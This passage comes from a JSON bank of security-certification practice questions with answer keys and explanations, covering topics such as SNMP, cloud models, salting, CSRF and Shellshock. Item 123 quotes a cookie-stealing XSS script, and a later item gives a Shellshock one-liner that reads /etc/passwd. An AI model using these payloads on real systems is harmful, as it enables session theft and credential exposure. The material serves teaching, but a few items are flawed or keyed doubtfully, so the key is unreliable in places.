      "question": "You are the head of the Network Administrators department. And one of your subordinates uses SNMP to manage networked devices from a remote location. To manage network nodes, your subordinate uses MIB, which contains formal descriptions of all network objects managed by SNMP. Which of the following types of MIB will your subordinate use to retrieve information about types for workstations and server services?",
      "options": [
        "WINS.MIB",
        "DHCP.MIB",
        "LNMIB2.MIB",
        "MIB_II.MIB"
      ],
      "correct": "C",
      "explanation": "LMMIB2.MIB (also written as LNMIB2.MIB) contains object types for workstation and server services."
    },
    {
      "q": 96,
      "type": "MCQ",
      "question": "You want to make your life easier and automate the process of updating applications. You decide to use a user-defined HTTP callback or push APIs that are raised based on trigger events. When this feature invokes, data is supplied to other applications so that users can instantly receive real-time information. What is the name of this technique?",
      "options": [
        "Webhooks",
        "Web shells",
        "SOAP API",
        "REST API"
      ],
      "correct": "A",
      "explanation": "A webhook is a method of augmenting or altering the behavior of a web page or web application with custom callbacks. These callbacks may be maintained, modified, and managed by third-party users. The format is usually JSON and the request is done as HTTP POST."
    },
    {
      "q": 97,
      "type": "MCQ",
      "question": "Recently your company set up a cloud computing service. Your system administrator reached out to a telecom company to provide Internet connectivity and transport services between the organization and the cloud service provider to implement this service. Which category does the telecom company fall in the above scenario according to NIST cloud deployment reference architecture?",
      "options": [
        "Cloud consumer",
        "Cloud carrier",
        "Cloud broker",
        "Cloud auditor"
      ],
      "correct": "B",
      "explanation": "A carrier cloud is a class of cloud that integrates wide area networks (WAN) and other attributes of communications service providers' carrier-grade networks. The cloud carrier provides Internet connectivity and transport services between the organization and cloud provider."
    },
    {
      "q": 98,
      "type": "MCQ",
      "question": "Ron, the hacker, is trying to crack an employee's password of the target organization utilizing a rainbow table. During the break-in, he discovered that upon entering a password that extra characters are added to the password after submitting. Which of the following countermeasures is the target company using to protect against rainbow tables?",
      "options": [
        "Password salting",
        "Password hashing",
        "Password key hashing",
        "Account lockout"
      ],
      "correct": "A",
      "explanation": "A salt is random data that is used as an additional input to a one-way function that hashes a password. A new salt is randomly generated for each password. Salts defend against pre-computed hash attacks like rainbow tables."
    },
    {
      "q": 99,
      "type": "MCQ",
      "question": "The attacker performs an attack during which, using a MITM attack technique, he sends his session ID using. Firstly the attacker obtains a valid session ID by logging into a service and later feeds the same session ID to the victim. The session ID links the victim to the attacker's account page without disclosing any information to the victim. Then the attacker waits until the victim clicks on the link, and after this, the sensitive payment details entered in a form are linked to the attacker's account. Which of the following attacks was the attacker performing?",
      "options": [
        "Session fixation",
        "CRIME",
        "Session donation",
        "Forbidden"
      ],
      "correct": "C",
      "explanation": "Session Donation involves social engineering to make the victim provide information to the attacker's account. An attacker creates an account and sends authenticated link to the victim, convincing them to provide information, but in reality it's the attacker's account."
    },
    {
      "q": 100,
      "type": "MCQ",
      "question": "Which of the following is API designed to reduce complexity and increase the integrity of updating and changing which uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application?",
      "options": [
        "REST API",
        "JSON-RPC",
        "RESTful API",
        "SOAP API"
      ],
      "correct": "C",
      "explanation": "RESTful APIs are designed using REST principles and HTTP communication protocols. They use HTTP methods such as PUT, POST, GET, and DELETE, and improve performance, scalability, simplicity, modifiability, visibility, portability, and reliability."
    },
    {
      "q": 101,
      "type": "MCQ",
      "question": "Which of the following is a vulnerability in which the malicious person forces the user's browser to send an authenticated request to a server?",
      "options": [
        "Cross-site request forgery",
        "Cross-site scripting",
        "Server-side request forgery",
        "Session hijacking"
      ],
      "correct": "A",
      "explanation": "Cross-site request forgery (CSRF) is a type of malicious exploit where unauthorized commands are submitted from a user that the web application trusts. It forces an authenticated user to execute unwanted actions."
    },
    {
      "q": 102,
      "type": "MCQ",
      "question": "The attacker created a fake account on a dating site and wrote to John with an offer to get acquainted. Fake profile photos enthralled John, and he initiated a conversation with the attacker's fake account. After a few hours of communication, the attacker began asking about his company and eventually gathered all the essential information about the target company. What is the social engineering technique the attacker used in this scenario?",
      "options": [
        "Baiting",
        "Piggybacking",
        "Honey trap",
        "Diversion theft"
      ],
      "correct": "C",
      "explanation": "Honey trap: An attacker pretends to be an attractive person and fakes an online relationship, in order to get sensitive information from their victim."
    },
    {
      "q": 103,
      "type": "MCQ",
      "question": "Which of the following encryption algorithms is a symmetric key block cipher that has a 128-bit block size, and its key size can be up to 256 bits?",
      "options": [
        "Twofish",
        "HMAC",
        "Blowfish",
        "IDEA"
      ],
      "correct": "A",
      "explanation": "Twofish is a symmetric key block cipher with a block size of 128 bits, with keys up to 256 bits. It was designed by Bruce Schneier as a successor to Blowfish."
    },
    {
      "q": 104,
      "type": "MCQ",
      "question": "All the industrial control systems of your organization are connected to the Internet. Your management wants to empower the manufacturing process, ensure the reliability of industrial networks, and reduce downtime and service disruption. You have been assigned to find and install an OT security tool that further protects against security incidents such as cyber espionage, zero-day attacks, and malware. Which of the following tools will you use to accomplish this task?",
      "options": [
        "Robotium",
        "IntentFuzzer",
        "BalenaCloud",
        "Flowmon"
      ],
      "correct": "D",
      "explanation": "Flowmon empowers manufacturers and utility companies to ensure the reliability of their industrial networks to avoid downtime and disruption of service continuity."
    },
    {
      "q": 105,
      "type": "MCQ",
      "question": "Jan 3, 2020, 9:18:35 AM 10.240.212.18 - 54373 10.202.206.19 - 22 tcp_ip. Based on this log, which of the following is true?",
      "options": [
        "SSH communications are encrypted; it's impossible to know who is the client or the server.",
        "Application is FTP and 10.240.212.18 is the client and 10.202.206.19 is the server.",
        "Application is SSH and 10.240.212.18 is the server and 10.202.206.19 is the client.",
        "Application is SSH and 10.240.212.18 is the client and 10.202.206.19 is the server."
      ],
      "correct": "D",
      "explanation": "Port 22 is SSH. 10.240.212.18 with high port 54373 is the client connecting to 10.202.206.19 on port 22 (SSH server)."
    },
    {
      "q": 106,
      "type": "MCQ",
      "question": "Identify the attack by description: When performing this attack, an attacker installs a fake communication tower between two authentic endpoints to mislead a victim. He uses this virtual tower to interrupt the data transmission between the user and the real tower, attempting to hijack an active session. After that, the attacker receives the user's request and can manipulate the virtual tower traffic and redirect a victim to a malicious website.",
      "options": [
        "Jamming signal attack",
        "aLTEr attack",
        "KRACK attack",
        "Wardriving"
      ],
      "correct": "B",
      "explanation": "The aLTEr attack can be used against LTE connected endpoints by intercepting traffic and redirecting it to malicious websites. The attacker acts as a man-in-the-middle by setting up a fake cell tower."
    },
    {
      "q": 107,
      "type": "MCQ",
      "question": "Your boss informed you that a problem was detected in the service running on port 389 and said that you must fix this problem as soon as possible. What service is running on this port, and how can you fix this problem?",
      "options": [
        "The service is LDAP. You must change it to 636, which is LDAPS.",
        "The findings do not require immediate actions and are only suggestions.",
        "The service is NTP, and you have to change it from UDP to TCP to encrypt it.",
        "The service is SMTP, and you must change it to SMIME, which is an encrypted way to send emails."
      ],
      "correct": "A",
      "explanation": "LDAP runs on port 389 unencrypted. LDAPS (LDAP over SSL/TLS) uses port 636 to encrypt the traffic and protect sensitive information like usernames and passwords."
    },
    {
      "q": 108,
      "type": "MCQ",
      "question": "The attacker plans to compromise the systems of organizations by sending malicious emails. He decides to use the tool to track the target's emails and collect information such as senders' identities, mail servers, sender IP addresses, and sender locations from different public sources. It also checks email addresses for leaks using haveibeenpwned.com API. Which of the following tools is used by the attacker?",
      "options": [
        "Infoga",
        "Netcraft",
        "ZoomInfo",
        "Factiva"
      ],
      "correct": "A",
      "explanation": "Infoga is a tool for gathering email account information (IP, hostname, country) from different public sources (search engines, PGP key servers, and shodan) and checks if emails were leaked using haveibeenpwned.com API."
    },
    {
      "q": 109,
      "type": "MCQ",
      "question": "The attacker is performing the footprinting process. He checks publicly available information about the target organization by using the Google search engine. Which of the following advanced operators will he use to restrict the search to the organization's web domain?",
      "options": [
        "[link:]",
        "[site:]",
        "[location:]",
        "[allinurl:]"
      ],
      "correct": "B",
      "explanation": "The [site:] operator in Google search restricts results to a specific website or domain. For example: site:example.com will only show results from example.com."
    },
    {
      "q": 110,
      "type": "MCQ",
      "question": "Justin, the evil hacker, wants to steal Joanna's data. He sends Joanna an email with a malicious link that looks legitimate. Joanna unknowingly clicks on the link, and it redirects her to a malicious web page, and John steals Joanna's data. Which of the following attacks is described in this scenario?",
      "options": [
        "Vishing",
        "Phishing",
        "Spoofing",
        "DDoS"
      ],
      "correct": "B",
      "explanation": "Phishing is a type of social engineering attack used to steal user data. It occurs when an attacker masquerading as a trusted entity dupes a victim into opening an email or message and clicking a malicious link."
    },
    {
      "q": 111,
      "type": "MCQ",
      "question": "While checking your organization's wireless network, you found that the wireless network component is not sufficiently secure. It uses an old encryption protocol designed to mimic wired encryption. Which of the following protocols is used in your organization's wireless network?",
      "options": [
        "WEP",
        "WPA3",
        "RADIUS",
        "WPA"
      ],
      "correct": "A",
      "explanation": "Wired Equivalent Privacy (WEP) was intended to mimic the privacy characteristics of a wired LAN. It uses the insecure RC4 cipher and has been easily crackable for well over a decade."
    },
    {
      "q": 112,
      "type": "MCQ",
      "question": "Which of the following is a cloud solution option where a customer can join with a group of users or organizations to share a cloud environment?",
      "options": [
        "Private",
        "Hybrid",
        "Community",
        "Public"
      ],
      "correct": "C",
      "explanation": "Community cloud deployment model supports multiple organizations sharing computing resources that are part of a community (e.g., universities cooperating in research, police departments sharing resources)."
    },
    {
      "q": 113,
      "type": "MCQ",
      "question": "Matthew successfully hacked the server and got root privileges. Now he wants to pivot and stealthy transit the traffic over the network, avoiding the IDS. Which of the following will be the best solution for Matthew?",
      "options": [
        "Use Alternate Data Streams to hide the outgoing packets from this server.",
        "Install Cryptcat and encrypt outgoing packets from this server.",
        "Install and use Telnet to encrypt all outgoing traffic from this server.",
        "Use HTTP so that all traffic can be routed vis a browser, thus evading the internal Intrusion Detection Systems."
      ],
      "correct": "B",
      "explanation": "Cryptcat enables encrypted communication between two systems using twofish encryption. The IDS can't detect the malicious behavior even when traveling across normal HTTP ports like 80 and 443."
    },
    {
      "q": 114,
      "type": "MCQ",
      "question": "Which of the following methods can keep your wireless network undiscoverable and accessible only to those that know it?",
      "options": [
        "Lock all users",
        "Delete the wireless network",
        "Disable SSID broadcasting",
        "Remove all passwords"
      ],
      "correct": "C",
      "explanation": "Disabling SSID broadcast will make your Wi-Fi network name invisible to other users. However, this only hides the name, not the network itself, and can still be discovered by tools like NetStumbler or Kismet."
    },
    {
      "q": 115,
      "type": "MCQ",
      "question": "Which of the following is a piece of hardware on a motherboard that generates encryption keys and only releases a part of the key so that decrypting a disk on a new piece of hardware is impossible?",
      "options": [
        "CPU",
        "GPU",
        "TPM",
        "UEFI"
      ],
      "correct": "C",
      "explanation": "A TPM (Trusted Platform Module) is a secure cryptoprocessor chip on the motherboard that generates encryption keys and keeps a part of the key inside the TPM. If an attacker tries to remove the chip or tamper with the motherboard, it will deny access."
    },
    {
      "q": 116,
      "type": "MCQ",
      "question": "Which of the following types of attack (that can use either HTTP GET or HTTP POST) allows an attacker to induce users to perform actions that they do not intend to perform?",
      "options": [
        "Browser Hacking",
        "Cross-Site Scripting",
        "Cross-Site Request Forgery",
        "SQL Injection"
      ],
      "correct": "C",
      "explanation": "Cross-site request forgery (CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform by making the authenticated user's browser send requests."
    },
    {
      "q": 117,
      "type": "MCQ",
      "question": "Which of the following SQLi types leverages a database server's ability to make DNS requests to pass data to an attacker?",
      "options": [
        "Union-based SQLi",
        "Time-based blind SQLi",
        "Out-of-band SQLi",
        "In-band SQLi"
      ],
      "correct": "C",
      "explanation": "Out-of-band SQL injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. It relies on the database server's ability to make DNS or HTTP requests to deliver data to an attacker."
    },
    {
      "q": 118,
      "type": "MCQ",
      "question": "As usual, you want to open your online banking from your home computer. You enter the URL www.yourbanksite.com into your browser. The website is displayed and prompts you to re-enter your credentials as if you have never visited the site before. You decide to check the URL of the website and notice that the site is not secure and the web address appears different. Which of the following types of attacks have you been exposed to?",
      "options": [
        "ARP cache poisoning",
        "DHCP spoofing",
        "DoS attack",
        "DNS hijacking"
      ],
      "correct": "D",
      "explanation": "DNS hijacking is the practice of subverting the resolution of DNS queries. A rogue DNS server translates domain names of desirable websites into IP addresses of sites with malicious content. This can make banking sites redirect to fake phishing sites."
    },
    {
      "q": 119,
      "type": "MCQ",
      "question": "The medical company has recently experienced security breaches. After this incident, their patients' personal medical records became available online and easily found using Google. Which of the following standards has the medical organization violated?",
      "options": [
        "HIPAA/PHI",
        "PII",
        "ISO 2002",
        "PCI DSS"
      ],
      "correct": "A",
      "explanation": "HIPAA (Health Insurance Portability and Accountability Act) Privacy Rule provides federal protections for personal health information (PHI) held by covered entities. Medical records are protected under HIPAA/PHI."
    },
    {
      "q": 120,
      "type": "MCQ",
      "question": "Which of the following type of viruses avoid detection changing their own code, and then cipher itself multiple times as it replicates?",
      "options": [
        "Tunneling virus",
        "Encryption virus",
        "Cavity virus",
        "Stealth virus"
      ],
      "correct": "D",
      "explanation": "A Stealth virus hides altered computer data and other harmful control functions in system memory. It self-modifies through code modification (changing virus signature of each infected file) and encryption (using different encryption key for each infected file)."
    },
    {
      "q": 121,
      "type": "MCQ",
      "question": "Which of the following algorithms uses a 64-bit block size that is encrypted three times with 56-bit keys?",
      "options": [
        "AES",
        "Triple DES",
        "DES",
        "IDEA"
      ],
      "correct": "B",
      "explanation": "Triple DES (3DES) applies the DES cipher algorithm three times to each data block. It uses 64-bit blocks and applies three 56-bit keys to produce more secure encryption than single DES."
    },
    {
      "q": 122,
      "type": "MCQ",
      "question": "Your organization is implementing a vulnerability management program to evaluate and control the risks and vulnerabilities in IT infrastructure. At the moment, your security department is in the vulnerability management lifecycle phase in which is executing the process of applying fixes on vulnerable systems to reduce the impact and severity of vulnerabilities. Which of the following vulnerability-management phases is your security department in?",
      "options": [
        "Verification",
        "Remediation",
        "Risk assessment",
        "Vulnerability scan"
      ],
      "correct": "B",
      "explanation": "Remediation phase involves prioritizing and fixing vulnerabilities in order according to business risk. It establishes controls and demonstrates progress by applying fixes on vulnerable systems."
    },
    {
      "q": 123,
      "type": "MCQ",
      "question": "You have discovered that someone is posting strange images without comments on your forum. You decide to check it out and discover the following code is hidden behind those images: <script>document.write('<img src=\"https://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '\" />'); </script>. What does this script do?",
      "options": [
        "This PHP file silently executes the code and grabs the user's session cookie and session ID.",
        "The code is a virus that is attempting to gather the user's username and password.",
        "The code injects a new cookie into the browser.",
        "The code redirects the user to another site."
      ],
      "correct": "A",
      "explanation": "This is a Cross-Site Scripting (XSS) attack. The script steals the user's cookies by escaping them and sending them to a malicious script (submitcookie.php) which can be used for session hijacking."
    },
    {
      "q": 124,
      "type": "MCQ",
      "question": "Your organization conducts a vulnerability assessment for mitigating threats. Your task is to scan the organization by building an inventory of the protocols found on the organization's machines to detect which ports are attached to services such as a web server, an email server or a database server. After this, you will need to select the vulnerabilities on each machine and start executing only the relevant tests. Which of the following type of vulnerability assessment solutions will you perform?",
      "options": [
        "Inference-based assessment",
        "Tree-based assessment",
        "Service-based solutions",
        "Product-based solutions"
      ],
      "correct": "A",
      "explanation": "Inference-based assessment gathers information through discovery (host identification, OS detection, port scanning, protocol detection), then intelligently selects and runs appropriate vulnerability checks. Only vulnerabilities that could be present on each machine's configuration will be tested."
    },
    {
      "q": 125,
      "type": "MCQ",
      "question": "What of the following is a file which is the rich target to discover the structure of a website during web-server footprinting?",
      "options": [
        "Robots.txt",
        "Document root",
        "index.html",
        "domain.txt"
      ],
      "correct": "A",
      "explanation": "Robots.txt is used to control crawling access. It can reveal directory structure, important files, and areas the website owner wants to keep hidden from search engines, making it a rich target for footprinting."
    }
  ],
  "3": [
    {
      "q": 1,
      "type": "MCQ",
      "question": "Alex works as a network administrator at ClassicUniversity. There are many Ethernet ports are available for professors and authorized visitors (but not for students) on the university campus. However, Alex realized that some students connect their notebooks to the wired network to have Internet access. He identified this when the IDS alerted for malware activities in the network. What should Alex do to avoid this problem?",
      "options": [
        "Disable unused ports in the switches.",
        "Ask students to use the wireless network.",
        "Separate students in a different VLAN.",
        "Use the 802.1x protocol."
      ],
      "correct": "D",
      "explanation": "The IEEE 802.1X standard defines an access control and authentication protocol that restricts the rights of unauthorized computers connected to the switch. IEEE 802.1X provides an authentication mechanism to devices wishing to attach to a LAN or WLAN."
    },
    {
      "q": 2,
      "type": "MCQ",
      "question": "An attacker stole financial information from a bank by compromising only a single server. After that, the bank decided to hire a third-party organization to conduct a full security assessment. Cybersecurity specialists have been provided with information about this case, and they need to provide an initial recommendation. Which of the following will be the best recommendation?",
      "options": [
        "Move the financial data to another server on the same IP subnet.",
        "Require all employees to change their passwords immediately.",
        "Place a front-end web server in a demilitarized zone that only handles external web traffic.",
        "Issue new certificates to the web servers from the root certificate authority."
      ],
      "correct": "C",
      "explanation": "The best solution would be to use a DMZ because it adds an additional layer of security to an organization's local area network: an external network node can access only what is exposed in the DMZ, while the rest of the organization's network is firewalled."
    },
    {
      "q": 3,
      "type": "MCQ",
      "question": "Which of the following components of IPsec provides confidentiality for the content of packets?",
      "options": [
        "AH",
        "IKE",
        "ESP",
        "ISAKMP"
      ],
      "correct": "C",
      "explanation": "Encapsulating Security Payload (ESP) is a member of the IPsec protocol suite. It provides origin authenticity through source authentication, data integrity through hash functions, and confidentiality through encryption protection for IP packets."
    },
    {
      "q": 4,
      "type": "MCQ",
      "question": "Transmission Control Protocol accepts data from a data stream, divides it into chunks, and adds a TCP header creating a TCP segment. A TCP segment consists of a segment header and a data section. The segment header contains 10 mandatory fields and an optional extension field. Which of the suggested fields is not included in the TCP segment header?",
      "options": [
        "Checksum",
        "Sequence Number",
        "Source Port",
        "Source IP address"
      ],
      "correct": "D",
      "explanation": "Source IP address is not part of the TCP segment header. The TCP header contains Source Port, Sequence Number, and Checksum, but IP addresses are part of the IP header, not the TCP header."
    },
    {
      "q": 5,
      "type": "MCQ",
      "question": "Identify the way to achieve chip-level security of an IoT device?",
      "options": [
        "Changing the password of the router",
        "Turning off the device when not needed or not in use",
        "Closing insecure network services",
        "Encrypting the JTAG interface"
      ],
      "correct": "D",
      "explanation": "Encrypting the JTAG interface provides chip-level security. JTAG is a hardware interface that provides direct communication with chips. An attacker with JTAG access could read/write memory, pause firmware execution, patch instructions, extract firmware, and bypass protection mechanisms."
    },
    {
      "q": 6,
      "type": "MCQ",
      "question": "One of the most popular tools in the pentester's arsenal - John the Ripper is designed for...",
      "options": [
        "Discover hosts and services on a computer network by sending packets and analyzing the responses.",
        "Automation of the process of detecting and exploiting the SQL injection vulnerability.",
        "Test password strength, brute-force encrypted or hashed passwords, and crack passwords via dictionary attacks.",
        "Search for various default and insecure files, configurations, and programs on any type of web servers."
      ],
      "correct": "C",
      "explanation": "John the Ripper is a free password cracking software tool that combines a number of password crackers into one package, autodetects password hash types, and includes a customizable cracker for testing password strength and cracking passwords."
    },
    {
      "q": 7,
      "type": "MCQ",
      "question": "In what type of testing does the tester have some information about the internal work of the application?",
      "options": [
        "Announced",
        "Black-box",
        "White-box",
        "Grey-box"
      ],
      "correct": "D",
      "explanation": "Gray box testing is an ethical hacking technique where hackers have limited information to identify a target's security network's strengths and weaknesses. It's a hybrid of white box and black box testing."
    },
    {
      "q": 8,
      "type": "MCQ",
      "question": "The analyst needs to evaluate the possible threats to Blackberry phones for third-party company. To do this, he will use the Blackjacking attack method to demonstrate how an attacker could circumvent perimeter defences and gain access to the corporate network. Which of the following tools is best suited for the analyst for this task?",
      "options": [
        "BBProxy",
        "Paros Proxy",
        "BBCrack",
        "Blooover"
      ],
      "correct": "A",
      "explanation": "BBProxy is part of the BlackBerry Attack Toolkit and allows the attacker to use a BlackBerry device as a proxy between the Internet and the internal network, establishing a covert channel between attackers and compromised hosts."
    },
    {
      "q": 9,
      "type": "MCQ",
      "question": "In order to prevent collisions and protect password hashes from rainbow tables, Maria, the system administrator, decides to add random data strings to the end of passwords before hashing. What is the name of this technique?",
      "options": [
        "Stretching",
        "Salting",
        "Extra hashing",
        "Masking"
      ],
      "correct": "B",
      "explanation": "A salt is random data that is used as an additional input to a one-way function that hashes data, a password, or passphrase. Salts defend against pre-computed hash attacks like rainbow tables."
    },
    {
      "q": 10,
      "type": "MCQ",
      "question": "Maria, the leader of the Blue Team, wants to use network traffic analysis to implement the ability to detect an intrusion in her network of several hosts quickly. Which tool is best suited to perform this task?",
      "options": [
        "Firewalls",
        "HIDS",
        "NIDS",
        "Honeypot"
      ],
      "correct": "C",
      "explanation": "Network intrusion detection systems (NIDS) are placed at strategic points within the network to monitor traffic to and from all devices on the network. They perform analysis of passing traffic on the entire subnet."
    },
    {
      "q": 11,
      "type": "MCQ",
      "question": "Identify a component of a risk assessment?",
      "options": [
        "Physical security",
        "Logical interface",
        "DMZ",
        "Administrative safeguards"
      ],
      "correct": "D",
      "explanation": "A complete and compliant risk assessment must include four distinct components: Technical Safeguards, Organizational safeguards, Physical safeguards, and Administrative safeguards. Administrative safeguards include business associate agreements, employee confidentiality agreements, background checks, termination checklists, and formal policies and procedures."
    },
    {
      "q": 12,
      "type": "MCQ",
      "question": "Which of the following types of keys does the Heartbleed bug expose to the Internet, making exploiting any compromised system very easy?",
      "options": [
        "Shared",
        "Private",
        "Root",
        "Public"
      ],
      "correct": "B",
      "explanation": "Heartbleed may be exploited to steal private keys. At the time of disclosure, around half a million of the Internet's secure web servers certified by trusted authorities were believed to be vulnerable, allowing theft of the servers' private keys and users' session cookies and passwords."
    },
    {
      "q": 13,
      "type": "MCQ",
      "question": "Shortly after replacing the outdated equipment, John, the company's system administrator, discovered a leak of critical customer information. Moreover, among the stolen data was the new user's information that excludes incorrect disposal of old equipment. IDS did not notice the intrusion, and the logging system shows that valid credentials were used. Which of the following is most likely the cause of this problem?",
      "options": [
        "Default Credential",
        "NSA backdoor",
        "Industrial Espionage",
        "Zero-day vulnerabilities"
      ],
      "correct": "A",
      "explanation": "A Default Credential vulnerability is most commonly found in devices like modems, routers, and other devices having pre-set administrative credentials. The vendor uses a single pre-defined set of admin credentials that can be misused if not changed by consumers."
    },
    {
      "q": 14,
      "type": "MCQ",
      "question": "An attacker gained access to a Linux host and stolen the password file from /etc/passwd. Which of the following scenarios best describes what an attacker can do with this file?",
      "options": [
        "Nothing because he cannot read the file because it is encrypted.",
        "The attacker can perform actions as a user because he can open it and read the user ids and corresponding passwords.",
        "Nothing because the password file does not contain the passwords themselves.",
        "The attacker can perform actions as root because the file reveals the passwords to the root user only."
      ],
      "correct": "C",
      "explanation": "On modern Unix systems the security-sensitive password information is stored in a different file using shadow passwords. The /etc/passwd file is readable by all users but contains no passwords themselves."
    },
    {
      "q": 15,
      "type": "MCQ",
      "question": "What is the minimum number of network connections needed for a multi-homed firewall?",
      "options": [
        "2",
        "4",
        "5",
        "3"
      ],
      "correct": "A",
      "explanation": "A multi-homed firewall has multiple NICs that connects to two or more networks. The minimum is 2 connections, though it can have more than three interfaces for further subdividing systems."
    },
    {
      "q": 16,
      "type": "MCQ",
      "question": "Identify the type of attack according to the following scenario: Ivan, a black-hat hacker, initiates an attack on a certain organization. In preparation for this attack, he identified a well-known and trust website that employees of this company often use. In the next step, Ivan embeds an exploit into the website that infects the target systems of employees when using the website. After this preparation, he can only wait for the successful execution of his attack.",
      "options": [
        "Spear Phishing",
        "Watering Hole",
        "Shellshock",
        "Heartbleed"
      ],
      "correct": "B",
      "explanation": "A watering hole attack is a security exploit where the attacker seeks to compromise a specific group by infecting websites that members of the group are known to visit. The attacker lurks near websites popular with the target, looking for opportunities to infect them with malware."
    },
    {
      "q": 17,
      "type": "MCQ",
      "question": "Which of the following documents describes the specifics of the testing, the associated violations and essentially protects both the organization's interest and third-party penetration tester?",
      "options": [
        "Project Scope",
        "Service Level Agreement",
        "Non-Disclosure Agreement",
        "Rules of Engagement"
      ],
      "correct": "D",
      "explanation": "Rules of engagement (ROE) are the formal permissions to conduct a penetration test. They provide certain rights and restrictions to the test team and help testers overcome legal, federal, and policy-related restrictions. ROE should clearly spell out the type and scope of testing, client contact details, sensitive data handling, and status meetings."
    },
    {
      "q": 18,
      "type": "MCQ",
      "question": "In what type of attack does the attacker forge the sender's IP address to gain access to protected systems and confidential data?",
      "options": [
        "IP fragmentation attack",
        "IP Spoofing",
        "Source Routing",
        "IP forwarding"
      ],
      "correct": "B",
      "explanation": "IP spoofing is a type of cyber-attack where someone attempts to use a computer or network to trick other networks by masquerading as a legitimate entity. The attacker modifies the packet header's source address to make the receiving system think the packet is from a trusted source."
    },
    {
      "q": 19,
      "type": "MCQ",
      "question": "Shellshock is a serious bug in the Bash command-line interface shell that allows an attacker to execute commands by gaining unauthorized access to computer systems. env x='(){ :;};echo exploit' bash -c 'cat /etc/passwd' What is the result of executing this query on a vulnerable host?",
      "options": [
        "Display of the contents of the passwd file.",
        "Copying the contents of the passwd file",
        "Deleting the passwd file.",
        "Creating a passwd file."
      ],
      "correct": "A",
      "explanation": "The command reads the password file /etc/passwd and adds it to the response. An attacker injecting this code through the Shellshock vulnerability would see the password file dumped out onto their screen."
    },
    {
      "q": 20,
      "type": "MCQ",
      "question": "Which of the following is a vulnerability in modern processors such as Intel, AMD and ARM using speculative execution?",
      "options": [
        "Launch Daemon",
        "Spectre and Meltdown",
        "Application Shimming",
        "Named Pipe Impersonation"
      ],
      "correct": "B",
      "explanation": "Meltdown and Spectre exploit critical vulnerabilities in modern processors. These hardware vulnerabilities allow programs to steal data currently being processed on the computer by exploiting speculative execution."
    },
    {
      "q": 21,
      "type": "MCQ",
      "question": "Buffer overflow mainly occurs when a created memory partition (or buffer) is written beyond its intended boundaries. If an attacker manages to do this from outside the program, this can cause security problems since it can potentially allow them to manipulate arbitrary memory cells, although many modern operating systems protect against the worst cases of this. What programming language is this example in?",
      "options": [
        "SQL",
        "Java",
        "C",
        "HTML"
      ],
      "correct": "C",
      "explanation": "Programming languages commonly associated with buffer overflows include C and C++, which provide no built-in protection against accessing or overwriting data in any part of memory and do not automatically check that data written to an array is within the boundaries of that array."
    },
    {
      "q": 22,
      "type": "MCQ",
      "question": "The network elements of the telecom operator are located in the data center under the protection of firewalls and intrusion prevention systems. Which of the following is true for additional security measures?",
      "options": [
        "No additional measures are required, since the attacker does not have physical access to the data center equipment.",
        "Firewalls and intrusion detection systems are sufficient to ensure complete security.",
        "Periodic security checks and audits are required. Access to network elements should be provided by user IDs with strong passwords.",
        "No additional measures are required since attacks and downtime are inevitable, and a backup site is required."
      ],
      "correct": "C",
      "explanation": "Periodic security checks and audits are required. Access to network elements should be provided by user IDs with strong passwords. This adds an extra layer of security and regular testing helps find vulnerabilities to increase system reliability."
    },
    {
      "q": 23,
      "type": "MCQ",
      "question": "What is the name of the practice of collecting information from published or otherwise publicly available sources?",
      "options": [
        "Human intelligence",
        "Artificial intelligence",
        "Open-source intelligence",
        "Social intelligence"
      ],
      "correct": "C",
      "explanation": "Open-source intelligence (OSINT) is a multi-method methodology for collecting, analyzing and making decisions about data accessible in publicly available sources. The term 'open' refers to overt, publicly available sources as opposed to covert or clandestine sources."
    },
    {
      "q": 24,
      "type": "MCQ",
      "question": "Black-hat hacker Ivan created a fraudulent website to steal users' credentials. What of the proposed tasks does he need to perform so that users are redirected to a fake one when entering the domain name of a real site?",
      "options": [
        "ARP Poisoning",
        "SMS phishing",
        "MAC Flooding",
        "DNS spoofing"
      ],
      "correct": "D",
      "explanation": "DNS spoofing is a form of computer security hacking where corrupt Domain Name System data is introduced into the DNS resolver's cache, causing the name server to return an incorrect IP address. This results in traffic being diverted to the attacker's computer."
    },
    {
      "q": 25,
      "type": "MCQ",
      "question": "The flexible SNMP architecture allows you to monitor and manage all network devices from a single console. The data exchange is based on the Protocol Data Unit (PDU). There are 7 PDUs in the latest version of the SNMP protocol. Which of them sends a notification about the past event immediately, without waiting for the manager's request, and does not need confirmation of receipt?",
      "options": [
        "GetRequest",
        "GetNextRequest",
        "Trap",
        "InformRequest"
      ],
      "correct": "C",
      "explanation": "TRAP is an asynchronous alert sent by the agent to the SNMP manager to indicate a significant event, such as an error or failure, has occurred. It does not require confirmation of receipt, unlike INFORMRequest."
    },
    {
      "q": 26,
      "type": "MCQ",
      "question": "The Domain Name System (DNS) is the phonebook of the Internet. When a user tries to access a web address like 'example.com', web browser or application performs a DNS Query against a DNS server, supplying the hostname. The DNS server takes the hostname and resolves it into a numeric IP address, which the web browser can connect to. Which of the proposed tools allows you to set different DNS query types and poll arbitrarily specified servers?",
      "options": [
        "Nikto",
        "Wireshark",
        "Nslookup",
        "Metasploit"
      ],
      "correct": "C",
      "explanation": "nslookup (from name server lookup) is a network administration command-line tool for querying the Domain Name System (DNS) to obtain the mapping between domain name and IP address, or other DNS records."
    },
    {
      "q": 27,
      "type": "MCQ",
      "question": "Which of the following is correct?",
      "options": [
        "Sniffers operate on Layer 3 of the OSI model.",
        "Sniffers operate on both Layer 2 & Layer 3 of the OSI model.",
        "Sniffers operate on Layer 2 of the OSI model.",
        "Sniffers operate on Layer 4 of the OSI model."
      ],
      "correct": "C",
      "explanation": "Sniffers operate at the OSI model's data link layer (Layer 2), which means they do not have to play by the same rules as applications and services that reside further up the stack. They can capture everything on the wire and record it for later review."
    },
    {
      "q": 28,
      "type": "MCQ",
      "question": "NIST defines risk management as the process of identifying, assessing, and controlling threats to an organization's capital and earnings. But what is the 'risk' itself?",
      "options": [
        "Potential that a threat will exploit vulnerabilities of an asset or group of assets.",
        "Weakness in an information system, system security procedures, internal controls, or implementation that could be exploited or triggered by a threat source.",
        "The unauthorized disclosure, modification, or use of sensitive data.",
        "An occurrence that actually or potentially jeopardizes the confidentiality, integrity, or availability of an information system."
      ],
      "correct": "A",
      "explanation": "Risk is the level of impact on organizational operations resulting from the operation of an information system given the potential impact of a threat and the likelihood of that threat occurring."
    },
    {
      "q": 29,
